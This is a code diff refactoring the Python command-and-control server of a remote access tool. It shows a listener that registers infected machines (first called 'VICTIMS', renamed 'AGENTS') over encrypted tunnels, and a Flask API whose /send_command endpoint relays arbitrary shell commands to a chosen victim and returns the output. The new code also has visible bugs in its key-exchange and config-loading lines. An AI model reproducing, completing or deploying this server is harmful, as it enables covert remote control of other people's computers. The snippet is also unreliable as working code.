@@ -30,25 +30,31 @@ parser.add_argument("-v", "--verbose", action="store_true")
 
 # --- [ Init variables ] ---
 
-current_dir = "/".join(__file__.split("/")[:-1])
-config = tomllib.load(open(current_dir + "/config/config.toml", "rb"))
+CURRENT_DIR = "/".join(__file__.split("/")[:-1])
+CONFIG      = tomllib.load(open(CURRENT_DIR + "/config/config.toml", "rb"))
 
-app_api = Flask(__name__)
+
+app_api      = Flask(__name__)
 http_session = HTTP_SESSION()
-whitelist_users = config.get("whitelist")
 
-if whitelist_users is None:
-    raise
+
+try:
+    WHITELIST            = CONFIG.get("whitelist")
+    HTTP_IP, HTTP_PORT   = CONFIG.get("http").get("host").split(":")
+    AGENT_IP, AGENT_PORT = CONFIG.get("agent").get("host").split(":")
+except Exception as e:
+    print(e)
+
 
 @dataclass
 class ServerConfig:
     FINGERPRINT = hashlib.sha256((hex(uuid.getnode()) + get_hwid()).encode()).hexdigest()
     BUFSIZE: int
-    VICTIMS: dict # {addr: [fingerprint, pc_name, EncryptedTunnel]}
 
-servercfg = ServerConfig(1024, {})
+    # { addr: [FINGERPRINT, PCNAME, obj(EncryptedTunnel)]}
+    AGENTS: dict
 
-# TODO: client management
+server_cfg = ServerConfig(1024, {})
 
 def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
    
@@ -56,16 +62,19 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
     
     @app_api.route("/access", methods=["POST"])
     async def access():
-        json_req: dict = request.get_json()
-        username: str = json_req["username"]
-        password: str = json_req["password"]
+        json_body: dict = request.get_json()
+        
+        USERNAME: str = json_body["username"]
+        PASSWORD: str = json_body["password"]
 
-        if username in whitelist_users:
+        if USERNAME in WHITELIST:
 
-            # Check password with the whitelist
-            if password == hashlib.sha256(whitelist_users[username].encode()).hexdigest():
+            password_whitelist_hashed = hashlib.sha256(WHITELIST[USERNAME].encode()).hexdigest()
+
+            if PASSWORD == password_whitelist_hashed:
                 # Generate & add session
                 session = http_session.add_session(request.remote_addr)
+                
                 return jsonify({"session": session[1]})
             else:
                 return jsonify({"error": "Username of password invalid"}), 401
@@ -73,20 +82,18 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
         else:
             return jsonify({"error": "Username or password invalid"}), 401
 
-        return jsonify({"session": session[1]})
-
      # >>> [GET_AGENTS] <<<
     
     @app_api.route("/get_agents/<session>")
     async def send_agents(session):
 
-        # Check IF exist session
-        if http_session.check(request.remote_addr, session):
+        if http_session.exist(request.remote_addr, session):
             
             # Add agents fingerprint into `agents_fingerprint`
             agents_fingerprint = []
-            for v in servercfg.VICTIMS:
-                agents_fingerprint.append(servercfg.VICTIMS[v][0].decode())
+            for v in server_cfg.AGENTS:
+                FINGERPRINT = server_cfg.AGENTS[v][0].decode()
+                agents_fingerprint.append(FINGERPRINT)
 
             return jsonify({"fingerprints": agents_fingerprint})
         
@@ -97,26 +104,26 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
 
     @app_api.route("/send_command", methods=["POST"])
     async def agent_command():
-        json_req: dict = request.get_json()
-        fingerprint = json_req["fingerprint"] # Agent fingerprint
-        command = json_req["command"]
+        json_body: dict = request.get_json()
+        
+        AGENT_FINGERPRINT = json_body["fingerprint"]
+        COMMAND = json_body["command"]
 
-        # Get addr:port by agent fingerprint
-        key_agent = api.get_tunnel_by_fingerprint(servercfg.VICTIMS, fingerprint)
+        key_agent = api.get_agent_by_fingerprint(server_cfg.AGENTS, AGENT_FINGERPRINT)
         
-        if key_agent is None:
-            return jsonify({"error": "This agent don't exist"}), 403
-        
-        else:
-            s: EncryptedTunnel = servercfg.VICTIMS[key_agent][2]
+        if not (key_agent is None):
+            s: EncryptedTunnel = server_cfg.AGENTS[key_agent][2]
             try:
                 # TODO: do better  -> set recv dynamic bufsize
-                s.send(command)
+                s.send(COMMAND)
              
-                return jsonify({"output": await s.recv(servercfg.BUFSIZE).decode()})
+                return jsonify({"output": await s.recv(server_cfg.BUFSIZE).decode()})
             
             except Exception as e:
                 return jsonify({"error": str(e)}), 408
+        
+        else:
+            return jsonify({"error": "This agent don't exist"}), 403
             
     # --- [ Start HTTP(s) server ] ---
 
@@ -126,15 +133,13 @@ def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
         app_api.run(host, port, debug)
 
 async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
-    # Get addr socket
-    peername = w.get_extra_info('peername')
-    formated_peername = peername[0] + ':' + str(peername[1])
+    PEERNAME = w.get_extra_info('peername')
+    CLIENT_SOCKET: socket.socket = w.get_extra_info('socket')
     
-    # Get socket
-    client_socket: socket.socket = w.get_extra_info('socket')
+    formated_peername = PEERNAME[0] + ':' + str(PEERNAME[1])
     
     # Get a fingerprint (random string)
-    fingerprint = await r.read(servercfg.BUFSIZE)
+    fingerprint = await r.read(server_cfg.BUFSIZE)
 
     # Generate rsa keys
     # will be used for key exchange + nonce to start communicating only with Salsa20
@@ -145,19 +150,22 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
     await w.drain()
 
     # Gets the RSA-encrypted string containing the key and nonce
-    # Decompress the packet with zlib
-    # Splits the string using '<SPR>' as the separator
-    key, nonce = zlib.decompress(rsa.decrypt(await r.read(servercfg.BUFSIZE), private_key)).split(b"<SPR>")
+    decrypted = rsa.decrypt(await r.read(server_cfg.BUFSIZE, private_key))
+    decompressed = zlib.decompress(decrypted).split(b"<SPR>")
+    
+    key, nonce = decompressed.split(b"<SPR>")
 
-    # Initializes the 'EncryptedTunnel' class that allows communication with the client using Salsa20,
-    # using the key and nonce obtained previously
+    # Memory clean
+    del(decrypted)
+    del(decompressed)
+
     enctunnel = EncryptedTunnel(r, w, key, nonce)
 
     # Adding to 'VICTIMS' the current victim: {addr: [fingerprint, pc_name, EncryptedTunnel]}
-    servercfg.VICTIMS[formated_peername] = [fingerprint, "pcname", enctunnel]
+    server_cfg.AGENTS[formated_peername] = [fingerprint, "pcname", enctunnel]
 
-    client_socket.setblocking(0)
-    ready = select.select([client_socket], [], [], 5)
+    CLIENT_SOCKET.setblocking(0)
+    ready = select.select([CLIENT_SOCKET], [], [], 5)
 
     while True:
         time.sleep(5)
@@ -166,7 +174,7 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
             if ready[0]:
                 await enctunnel.recv(2)
         except:
-            servercfg.VICTIMS.pop(formated_peername)
+            server_cfg.AGENTS.pop(formated_peername)
             break
 
 async def main():
@@ -176,13 +184,14 @@ async def main():
     logging.getLogger("werkzeug").disabled = True
 
     # Open multiple server
-    server_victims = await asyncio.start_server(handle_victims, '0.0.0.0', 8888)
-    if not args.ssl:
-        https_files = ()
+    server_victims = await asyncio.start_server(handle_victims, AGENT_IP, AGENT_PORT)
+    
+    if args.ssl:
+        https_files = (CURRENT_DIR + "/config/website.crt", CURRENT_DIR + "/config/private.key")
     else:
-        https_files = (current_dir + "/config/website.crt", current_dir + "/config/private.key")
+        https_files = ()
 
-    threading.Thread(target=server_api, args=('127.0.0.1', config.get("api").get("port"), False, https_files)).start()
+    threading.Thread(target=server_api, args=(HTTP_IP, HTTP_PORT, False, https_files)).start()
 
     # Looping server
     async with server_victims:
